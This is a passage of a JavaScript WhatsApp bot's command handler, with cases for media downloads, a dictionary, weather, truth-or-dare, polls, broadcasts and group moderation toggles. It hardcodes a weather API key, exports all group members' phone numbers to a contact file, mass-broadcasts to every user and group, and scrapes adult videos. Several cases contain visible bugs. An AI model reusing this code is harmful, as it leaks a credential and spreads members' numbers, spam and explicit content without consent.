case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
ThugBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await ThugBotInc.sendMessage(m.chat, { audio: ThugBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await loading()
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
reply('*Managed to Get One Person*')
}, 5000)
setTimeout(() => {
ThugBotInc.sendMessage(frommeky, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break

case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
  if (!text) return reply(`*Example: ${prefix + command} <tiktok link>`)
  if (!text.includes('tiktok.com')) return reply('Url Tidak Mengandung Result Dari Tiktok!')
  const hasil = await tiktokDl(text);
  await loading()
  await ThugBotInc.sendMessage(m.chat, {
    audio: { url: hasil.music_info.url },
    mimetype: 'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        title: 'TikTok • ' + hasil.author.nickname,
        body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
        previewType: 'PHOTO',
        thumbnailUrl: hasil.cover,
        mediaType: 1,
        renderLargerThumbnail: true,
        sourceUrl: text
      }
    }
  }, { quoted: m });
}
break        
case 'dictionary': {
    await ThugBotInc.sendMessage(m?.chat, {react: {text: `📖`, key: m?.key}});

    // Check if user has remaining limit
    if (db.data.users[sender].limit < 1) return reply(mess.limit);

    // If no word is provided, prompt user for one
    if (!q) return reply(`*Hey 👋 ${pushname} , I'm Queen Akari your personal dictionary/tutor*\n*What word would you like to learn?*\n*Usage : ${prefix + command} photosynthesis*`);
    await loading()

    try {
        // Fetch definition from Urban Dictionary API
        const targetFine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${encodeURIComponent(q)}`);

        // Check if we received a valid response with at least one definition
        if (!targetFine || !targetFine.data.list.length) return reply('*No definition found.*');

        const definition = targetFine.data.list[0].definition.replace(/\[|\]/g, "");
        const example = targetFine.data.list[0].example.replace(/\[|\]/g, "");

        // Generate image URL from Unsplash
        const imageUrl = `https://unsplash.com/s/photos/${encodeURIComponent(q)}`;  // Use Unsplash's random image API

        const reply = `
📖 *Word:* ${q}
🖼️ *Image:* ${imageUrl}
💬 *Definition:* ${definition}
✍️ *Example:* ${example}`;

        // Send confirmation reaction
        await ThugBotInc.sendMessage(m?.chat, {react: {text: `✅`, key: m?.key}});

        // Send the result text message
        await ThugBotInc.sendMessage(m?.chat, {text: reply}, {quoted: m});

        // Prepare text-to-speech (TTS) audio (Ensure googleTTS is defined and imported)
        const googleTTS = require('google-tts-api'); // Ensure you have the correct TTS library
        const xeonrl = googleTTS.getAudioUrl(q, {
            lang: "en",
            slow: false,
            host: 'https://translate.google.com',  // Correct TTS API
        });

        // Send the TTS audio message
        return ThugBotInc.sendMessage(m.chat, {
            audio: { url: xeonrl },
            mimetype: 'audio/mp4',
            ptt: true,
            fileName: `${q}.mp3`
        }, {quoted: m});

    } catch (error) {
        console.error('Error fetching dictionary data:', error);
        return reply('*Sorry, I encountered an error while fetching the definition.*');
    }
}
break;            
case 'weather':{
if (!text) return reply(`*Enter a location*\n*Example : ${prefix+command}Lagos, Nigeria*`)
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${args.join(" ")}&units=metric&appid=e409825a497a0c894d2dd975542234b0&language=tr`
            );
            let textw = ""
            textw += `*🌦️Weather of  ${text} 🌦️*\n\n`
            textw += `*🌦️Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*📖 Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*🌡️Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*❄️Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*💨 Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*💧Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*🍃Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*🌐 Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*🌐 Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*🗺️Country:-* ${wdata.data.sys.country}\n`

           ThugBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break            
            case 'gdrive':
            case 'g-drive': {
		if (!args[0]) return reply(`*Enter the Google Drive link*`)
	await loading()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	ThugBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case 'pinterest': {
if (!text) return reply(`Enter Query`)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
ThugBotInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'hentaivid': case 'hentaivideo': {
                await loading()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                ThugBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break            
            case 'savecontact': case 'svcontact':{
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
let cmiggc = await ThugBotInc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
reply('\n*Please wait, saving*'+cmiggc.participants.length+' *contacts*')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
ThugBotInc.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\n*All contacts have been saved*\n*Group: '+cmiggc.subject+'\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
  case 'bc':
            case 'broadcast': {
               if (!ThugTheCreator) return reply(mess.owner)
               if (!text) return reply('*Ugh, provide a text you want to broadcast*\n*Example : Hello everyone*')
               let teksnya = `${text}\n🗓️*Date: ${xdate} ${xtime}*`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await ThugBotInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await ThugBotInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await ThugBotInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               reply(`*Successfully sent ${command} to ${Object.keys(global.db.data.users).length} users*`)
            }
            break
            case 'block': {
		if (!ThugTheCreator) return reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ThugBotInc.updateBlockStatus(users, 'block')
		await reply(`*User has been blocked*`)
	}
	break
	case 'unblock': {
		if (!ThugTheCreator) return reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ThugBotInc.updateBlockStatus(users, 'unblock')
		await reply(`*User has been unblocked*`)
	}
	break
            case 'broadcast-gc':
            case 'bcgroup': {
                if (!ThugTheCreator) return reply(mess.owner)
                if (!text) return reply(`*Ugh, provide a text*\n\n*Example : ${prefix + command} hello everyone*`)
                let getGroups = await ThugBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`*Sending broadcast to ${anu.length} group chats, end time ${anu.length * 1.5} seconds*`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `*${ownername}'s Broadcast*\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    ThugBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.imgur.com/JFBxdAI.jpeg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                reply(`*Broadcast successfully sent to ${anu.length} group chats*`)
            }
            break
             case 'truth':
    const truth = [
        "What’s something you’ve done that you’ve never told anyone about? 🤐",
        "Who’s your secret crush? 😏",
        "What’s the worst lie you’ve ever told? 😬",
        "Do you believe in love at first sight? 💘",
        "Have you ever broken someone’s heart? 💔",
        "What’s the most embarrassing thing you’ve done in public? 🤭",
        "Do you ever lie about your feelings? 😔",
        "What’s the biggest secret you’ve kept from your parents? 🙊",
        "What’s your biggest fear in life? 😱",
        "Have you ever kissed someone you didn’t like? 💋",
        "Do you think you’ve ever been in love? ❤️",
        "What’s something you’ve done just to get attention? 🎯",
        "Have you ever cheated on someone? 💔",
        "What’s your biggest regret? 😓",
        "Who do you trust the most in your life? 🫶",
        "Have you ever stolen anything? 🛑",
        "What’s the most awkward thing you’ve done for someone? 😬",
        "Have you ever had a crush on a friend’s partner? 😳",
        "What’s the meanest thing you’ve ever done to someone? 😤",
        "What’s something you’re afraid to admit? 🤐",
        "Do you believe in soulmates? 💑",
        "Have you ever been caught doing something you weren’t supposed to? 😅",
        "What’s your biggest insecurity? 🥺",
        "Have you ever made a big mistake in a relationship? 😔",
        "What’s the craziest thing you’ve done for love? 💕",
        "Who’s your biggest role model? 🌟",
        "What’s the hardest thing you’ve ever done? 💪",
        "What’s one thing you wish you could forget? 😢",
        "Have you ever lied to get out of trouble? 🤥",
        "What’s the most embarrassing thing you’ve said to someone you like? 😳",
        "What’s one thing you can’t live without? 💎",
        "What’s your biggest fear in a relationship? 💔",
        "What’s the worst advice you’ve ever followed? 🤦‍♂️",
        "Have you ever ghosted someone? 👻",
        "What’s the most romantic thing you’ve ever done for someone? ❤️",
        "What’s something you’re ashamed of? 😳",
        "Who do you think is the most attractive person in this group? 🔥",
        "What’s the worst date you’ve ever been on? 🍽️",
        "Do you have any weird habits? 🦸",
        "What’s your idea of a perfect day? 🌞",
        "Who’s your celebrity crush? 💖",
        "What’s something you wish you could change about yourself? 🤔",
        "What’s the most childish thing you still do? 👶",
        "What’s something you’ve done that you would never tell your parents? 😬",
        "What’s your biggest dream? 🌠",
        "What’s your biggest fear when it comes to love? 💔",
        "Have you ever had a secret crush? 😘",
        "What’s the weirdest dream you’ve ever had? 🌙",
        "What’s your worst habit? 🚬",
        "Have you ever been in love with someone who didn’t love you back? 💔",
        "What’s one thing you would never forgive someone for? 😡",
        "What’s the last thing you Googled? 🔍",
        "What’s something you do when no one is watching? 👀",
        "What’s the best advice you’ve ever received? 🧠",
        "Have you ever made a prank call? 📞",
        "What’s your most embarrassing childhood memory? 👶",
        "What’s the scariest thing that has ever happened to you? 😨",
        "Have you ever had a near-death experience? 🚑",
        "What’s one thing that always makes you laugh? 😂",
        "What’s your most memorable vacation? 🌴",
        "What’s the worst gift you’ve ever received? 🎁",
        "What’s one thing you regret not doing? 😔",
        "Who’s the most supportive person in your life? 🤗",
        "What’s the weirdest thing you’ve eaten? 🍴",
        "Have you ever been in a toxic relationship? 💔",
        "What’s the most embarrassing thing you’ve done to impress someone? 😅",
        "What’s something you’ve always wanted to learn? 📚",
        "What’s the biggest challenge you’ve overcome? 💪",
        "Who’s the last person you texted? 📱",
        "What’s the biggest risk you’ve ever taken? 🎲",
        "What’s the most dangerous thing you’ve done? 🏍️",
        "What’s one thing you do to de-stress? 🧘",
        "What’s your favorite memory with your best friend? 🤗",
        "What’s your biggest turn-off in a relationship? 😷",
        "What’s the weirdest thing you’ve been complimented on? 💬",
        "What’s something you’re really bad at? 🙈",
        "What’s the last thing you did for the first time? 🤔",
        "What’s the most surprising thing you’ve learned about yourself? 🧐",
        "Who’s the last person you hugged? 🤗",
        "Have you ever been heartbroken? 💔",
        "What’s the most spontaneous thing you’ve ever done? 🎉",
        "What’s your biggest fear about growing up? ⏳",
        "What’s the last thing you cried about? 😢",
        "What’s one thing you wish you could change about your life? 🔄",
        "What’s the craziest thing you’ve ever done on a dare? 😈",
        "Who’s the last person you made laugh? 😂",
        "What’s the most awkward thing you’ve said on a date? 😬",
        "What’s the worst thing you’ve ever done to get revenge? 🔥",
        "What’s the last song you listened to? 🎶",
        "What’s the last movie you watched? 🎥",
        "What’s one thing you’ve never told anyone about your past? ⏳",
        "What’s the hardest thing you’ve had to tell someone? 💔",
        "What’s the worst lie you’ve told in a relationship? 😔",
        "What’s the craziest rumor you’ve heard about yourself? 🧐",
        "What’s your worst fear about love? 💔",
        "What’s the last thing you bought online? 🛒",
        "What’s something you do when no one is around? 👀",
        "What’s your biggest relationship dealbreaker? 🚫",
        "Have you ever had a crush on a celebrity? 🎬",
        "What’s the most awkward situation you’ve been in? 😬",
        "What’s one thing you would never do for love? 🚫",
        "What’s something that scares you but you want to do anyway? 😱",
        "Who do you go to for relationship advice? 💌",
        "What’s one thing you’ve learned from a past relationship? 💭",
        "What’s the most painful thing someone has ever said to you? 😞",
        "What’s the one thing that makes you happiest in life? 😊"
    ];

    const xeontruth = truth[Math.floor(Math.random() * truth.length)];
    buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`);
    ThugBotInc.sendMessage(frommeky, { image: buffertruth, caption: '*YOU HAVE CHOSEN TRUTH*\n'+ xeontruth }, {quoted:m});
    break;


            case 'dare':
    const dare = [
        "Sing a song in front of the group 🎶",
        "Do a 5-minute workout and post it 🏋️‍♂️",
        "Send a voice message saying something funny 🤪",
        "Post a photo with a funny filter 🤳",
        "Take a picture with your eyes closed 👀",
        "Act like a monkey for 30 seconds 🐒",
        "Send a screenshot of your first text conversation 📱",
        "Dance with a broom like it's a partner 💃",
        "Do a dramatic reading of a text message 📜",
        "Send a video of you trying to do a backflip 🤸‍♂️",
        "Pretend you're a waiter and take everyone's order 🍴",
        "Sing the chorus of your favorite song 🎤",
        "Do a funny impression of a celebrity 🏆",
        "Try to juggle three random objects 🤹",
        "Record yourself doing a TikTok dance 📱",
        "Talk like a pirate for the next 5 minutes 🏴‍☠️",
        "Post a picture of your favorite childhood toy 🧸",
        "Send a voice message singing a random song 🎶",
        "Post a random fact about yourself 🧠",
        "Take a funny selfie with no filter 😂",
        "Do 10 push-ups and post a video 📹",
        "Pretend you’re a famous singer for 2 minutes 🎤",
        "Make a funny face and send a video 🎥",
        "Do a 30-second yoga pose 🧘‍♂️",
        "Imitate a cartoon character 🎬",
        "Send a picture of your pet (if you have one) 🐕",
        "Record a funny skit about your day 🎭",
        "Talk to your reflection in the mirror for 1 minute 🪞",
        "Do 20 sit-ups and send a picture 📸",
        "Post a silly face on your status 🥴",
        "Send a video of you doing a silly walk 🚶‍♂️",
        "Take a picture of your shoes 🥿",
        "Do a quick 5-minute workout 🏃‍♀️",
        "Post a picture of your favorite food 🍕",
        "Shout your favorite color out loud 🌈",
        "Dance in front of the mirror and rate yourself 💃",
        "Talk in rhymes for the next 5 minutes 📝",
        "Sing the national anthem 🎶",
        "Do a cartwheel and send a video 🤸‍♀️",
        "Pretend to be a news anchor and report the weather 🌦️",
        "Record a song for 30 seconds 🎤",
        "Send a voice message saying 'I love you' to your best friend 💖",
        "Make a short dance video and put it on your status 💃",
        "Do 10 jumping jacks in front of the camera 🎥",
        "Take a picture of your messy room 🏚️",
        "Share an embarrassing moment from your childhood 🍼",
        "Post a funny face video on your status 📹",
        "Imitate a famous actor for 1 minute 🎭",
        "Sing the chorus of a random song 🎶",
        "Send a random funny joke in the group 😂",
        "Do a funny dance move and send it in a voice note 🎵",
        "Send a picture of your morning face 🌞",
        "Pretend you’re a robot for the next 2 minutes 🤖",
        "Do a dramatic monologue 🎤",
        "Record a funny dance video and send it here 💃",
        "Say something nice about someone in the group 💬",
        "Change your status to 'I love my friends' for 1 hour ❤️",
        "Send a video acting like a baby 🍼",
        "Say 'I am a champion' and record it 💪",
        "Send a picture of your favorite book 📚",
        "Do a silly dance and send it to the group 💃",
        "Send a screenshot of your phone home screen 📱",
        "Call a random contact and sing a song 🎤",
        "Post a random meme you find funny 😂",
        "Send a voice message with your funniest laugh 😂",
        "Dance to a random song for 1 minute 🎵",
        "Record a voice note with a motivational quote 💬",
        "Make a funny face and send it here 😜",
        "Imitate your favorite singer for 1 minute 🎶",
        "Post a funny video of your pet 🐶",
        "Take a random selfie and share it 🤳",
        "Send a video of you trying to do a backflip 🤸‍♀️",
        "Say 'I love pizza' in the weirdest voice 🍕",
        "Call someone and say 'You’re my best friend' 💖",
        "Send a picture of your favorite food 🍔",
        "Do 20 push-ups and send a video 📹",
        "Imitate a cartoon character for 2 minutes 🎬",
        "Post a photo with a funny caption 📸",
        "Dance like no one’s watching 💃",
        "Pretend you're a famous celebrity for 1 minute 🌟",
        "Send a random fact about yourself 🧠",
        "Post a picture of your favorite place 🌍",
        "Take a photo with a funny face 🥴",
        "Send a voice note saying 'I’m your biggest fan' 💫",
        "Shout 'I am the champion' in a video 🎤",
        "Dance with your favorite stuffed animal 🧸",
        "Call someone and tell them a random joke 😂",
        "Record a video of you singing a song 🎤",
        "Send a picture of your pet doing something funny 🐱",
        "Do 10 sit-ups and post a video 🏋️",
        "Send a screenshot of your last text message 📱",
        "Do a funny impression of someone you know 🎭",
        "Say 'I’m the king/queen' in a video 👑",
        "Take a silly selfie and send it here 🤳",
        "Post a funny meme on your story 😂",
        "Do 20 jumping jacks and send a picture 📸",
        "Pretend you’re a famous singer for 2 minutes 🎤",
        "Record yourself singing your favorite song 🎶",
        "Post a picture of your childhood favorite snack 🍫",
        "Send a voice note acting like a superhero 🦸‍♂️",
        "Shout a random word out loud and record it 📣",
        "Do a dramatic reading of your favorite book 📖",
        "Send a voice note saying 'I love you' to a friend 💖",
        "Make a funny meme about yourself and share it 📸",
        "Take a picture with your hands on your face 🤦‍♂️",
        "Send a funny story from your life 📖",
        "Post a video of you acting like a robot 🤖",
        "Say 'I’m the best' in the funniest voice you can find 🎤",
        "Do 10 push-ups and record it 📹",
        "Record a funny video and tag someone in it 🎬"
    ];

    const xeondare = dare[Math.floor(Math.random() * dare.length)];
    bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`);
    ThugBotInc.sendMessage(frommeky, { image: bufferdare, caption: '*YOU HAVE CHOSEN DARE*\n'+ xeondare }, {quoted:m});
    break;    
            case 'poll': {
	if (!ThugTheCreator) return reply(mess.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await reply(
                    `*Provide a question with at least two options*\n*Example : ${prefix}poll who is the best footballer?|Ronaldo,Messi,Mbappe....*`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await ThugBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
          case 'setantiforeign':
                if (!ThugTheCreator) return reply(mess.owner)
                if (!text) return reply(`*Example : ${prefix + command} +91*`)
                global.antiforeignnumber = text
                reply(`*Antiforeign updated to kick ${text} country code users*`)
                break
        case 'antiforeign':{
            	if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                  db.data.chats[frommeky].antiforeignnum = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
                  db.data.chats[frommeky].antiforeignnum = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break       
           case 'antilink': {
    if (!m.isGroup) return reply(mess.group); // Check if it's a group
    if (!isBotAdmins) return reply(mess.botadmin); // Check if the bot is an admin
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin); // Check if the user is an admin or creator
    
    if (!text) return reply('*On/Off?*'); // Ensure arguments are provided
    
    if (args[0].toLowerCase() === 'on') { // Check if the argument is 'on'
        if (db.data.chats[frommeky]?.antilink) return reply('*Feature already enabled*'); // Check if antilink is already enabled
        db.data.chats[frommeky].antilink = true; // Enable antilink
        reply(`*${command} has been enabled*`);
    } else if (args[0].toLowerCase() === 'off') { // Check if the argument is 'off'
        if (!db.data.chats[frommeky]?.antilink) return reply('*Feature already disabled*'); // Check if antilink is already disabled
        db.data.chats[frommeky].antilink = false; // Disable antilink
        reply(`*${command} has been disabled*`);
    } else {
        reply('*Invalid option. Use On/Off.*'); // Handle invalid arguments
    }
}
break;

            case 'antipoll':{
      	if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antipoll) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antipoll = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
                if (db.data.chat[frommeky].antipoll) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antipoll = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antisticker':{
            if (!ThugTheCreator) return reply(mess.owner)
  	if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antisticker) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antisticker = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
                if (db.data.chat[frommeky].antisticker) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antisticker = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antiimage':{
            if (!ThugTheCreator) return reply(mess.owner)
     if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antiimage) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antiimage = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antiimage) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antiimage = false
                  reply(`${command} has been disabled*`)
               }
               }
            break
            case 'antivideo':{
     	if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
if (!ThugTheCreator) return reply(mess.owner)
if (!isBotAdmins) return reply(mess.botadmin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antivideo) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antivideo = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antivideo) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antivideo = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antivirtex':{
     if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
if (!ThugTheCreator) return reply(mess.owner)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antivirtex) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antivirtex = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antivirtex) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antivirtex = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antibot) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antibot = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antibot) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antibot = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antiviewonce': case 'antionceview': {
		         if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antiviewonce) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antiviewonce = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antiviewonce) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antiviewonce = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
if (!ThugTheCreator) return reply(mess.owner)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antimedia) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antimedia = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antimedia) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antimedia = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antidocument) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antidocument = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antidocument) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antidocument = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].anticontact) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].anticontact = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].anticontact) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].anticontact = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antilocation) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antilocation = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antilocation) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antilocation = false
                  reply(`*${command} has been disabled*`)
               }
               }
            break
            case 'antilinkgc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antilinkgc) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antilinkgc = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antilinkgc) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antilinkgc = false
                  reply(`*${command} has been disabled*`)
               }
            }
            break
            case 'antilinkyt': {
        if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmins) return reply(mess.botadmin)
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antiyoutube) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antiyoutube = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
                if (db.data.chat[frommeky].antiyoutube) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antiyoutube = false
                  reply(`*${command} has been disabled*`)
               }
            }
            break 
            case 'antilinkfb': {
        if (!m.isGroup) return reply(mess.group)
